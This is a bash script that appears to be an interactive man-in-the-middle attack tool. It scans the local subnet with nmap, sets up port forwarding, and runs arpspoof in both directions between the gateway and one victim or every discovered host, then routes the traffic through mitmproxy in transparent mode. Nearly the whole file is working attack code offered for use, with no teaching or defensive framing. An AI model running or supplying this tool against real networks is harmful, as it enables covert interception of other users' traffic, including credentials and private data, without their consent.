# ----------Start: Initialize variables----------
ex=0
sc=0
st=0
fw=0
sc_auto=0
st_auto=0
fw_auto=0
dns=0
# ----------End: Initialize variables----------
# ----------Start: Terminal input 1----------
case $1 in
"") take_input=1;;
"-c") take_input=0;;
"--command") take_input=0;;
"-h") cat help.txt; exit 0;;
"--help") cat help.txt; exit 0;;

*) echo "'$1' is not a recognized option. Try 'mitm --help' for a list of options"; exit 2;;

esac
# ----------End: Terminal input 1----------
# ----------Start: Direct input 2----------
if [ $take_input -eq 0 ]
then
case $2 in
"exit") ex=1;;
"attack") st_auto=1;;
"foward") fw_auto=1;;
"scan") sc_auto=1;;
"help") cat help.txt; exit 0;;

*) echo "'$2' is not a recognized command. Try 'mitm --help' for a list of commands";;

esac
fi
# ----------End: Direct input 2----------
# ----------Start: Default gateway check----------
dgateway=$(/sbin/ip route | awk '/default/ { print $3 }' | tail -n 1)
if [ "$dgateway" = "" ]
then
echo -e "\e[31m[-] No Connection Found\e[39m"
else
d_length=`expr length $dgateway`
unit_length=`expr $d_length - 1`
unit_ip=${dgateway:0:$unit_length}
end_ip="${unit_ip}255"
fi
# ----------End: Default gateway check----------
# ----------Start: Mitm loop----------
while [ $ex -eq 0 ]
do
# ----------Start: Take input----------
if [ $take_input -eq 1 ]
then
echo -n "mitm> "
read input
case $input in
"exit") ex=1;;
"attack") st=1;;
"foward") fw=1;;
"scan") sc=1;;
"help") cat help.txt;;

*) echo "'$input' is not a recognized command. Try 'help' for a list of commands";;

esac
fi
# ----------End: Take input----------
# ----------Start: Scan----------
if [ $sc -eq 1 ]
then
if [ "$unit_ip" != "" ]
then
nmap -sn ${unit_ip}0/24
else
echo -e "\e[31m[-] No Connection\e[39m"
fi
sc=0
fi
# ----------End: Scan----------
# ----------Start: Scan auto----------
if [ $sc_auto -eq 1 ]
then
if [ "$unit_ip" != "" ]
then
nmap -sn ${unit_ip}0/24
else
echo -e "\e[31m[-] No Connection\e[39m"
exit 1
fi
exit 0
fi
# ----------End: Scan auto----------
# ----------Start: Initialize attack----------

# ----------End: Initialize attack----------
# ----------Start: Foward----------
if [ $fw -eq 1 ]
then
echo -n "Interface: "
read interface
echo -n "Src Port: "
read port_src
echo -n "Dest Port: "
read port_dest
if ./fowardmitm.sh $interface $port_src $port_dest
then
echo -e "\e[32m[*] Port Routing Successful\e[39m"
else
echo -e "\e[31m[-] Port Routing Failed\e[39m"
fi
fw=0
fi
# ----------End: Foward----------
# ----------Start: Foward auto----------
if [ $fw_auto -eq 1 ]
then
if ./fowardmitm.sh $3 $4 $5
then
echo -e "\e[32m[*] Port Routing Successful\e[39m"
else
echo -e "\e[31m[-] Port Routing Failed\e[39m"
fi
exit 0
fi
# ----------End: Foward auto----------
# ----------Start: Arp attack----------
if [ $st -eq 1 ]
then
echo -n "IP: "
read ip
echo -n "Interface: "
read interface_mitm
echo -n "Script: "
read script
echo -e "\e[32m[*] Starting MITM on $ip ...\e[39m"
if [ $ip = "all" ]
then
ips=`nmap -sn -n ${unit_ip}0/24 | grep ${unit_ip}* | awk '{print $5;}' | tr "\n" " "`
for word in $ips
do
arpspoof -i $interface_mitm -t $word $dgateway &>/dev/null &
arpspoof -i $interface_mitm -t $dgateway $word &>/dev/null &
done
else
arpspoof -i $interface_mitm -t $ip $dgateway &> /dev/null &
arpspoof -i $interface_mitm -t $dgateway $ip &> /dev/null &
fi
mitmproxy -T --host
killall arpspoof
st=0
fi
# ----------End: Arp attack----------
# ----------Start: Arp attack auto----------
if [ $st_auto -eq 1 ]
then
echo -e "\e[32m[*] Starting MITM on $3 ...\e[39m"
if [ $3 = "all" ]
then
ips=`nmap -sn -n ${unit_ip}0/24 | grep ${unit_ip}* | awk '{print $5;}' | tr "\n" " "`
for word in $ips
do
arpspoof -i $4 -t $word $dgateway &>/dev/null &
arpspoof -i $4 -t $dgateway $word &>/dev/null &
done
else
arpspoof -i $4 -t $3 $dgateway &>/dev/null &
arpspoof -i $4 -t $dgateway $3 &>/dev/null &
fi
mitmproxy -T --host
killall arpspoof
exit 0
fi
# ----------End: Arp attack auto----------
done
# ----------End: Mitm loop----------
exit 0

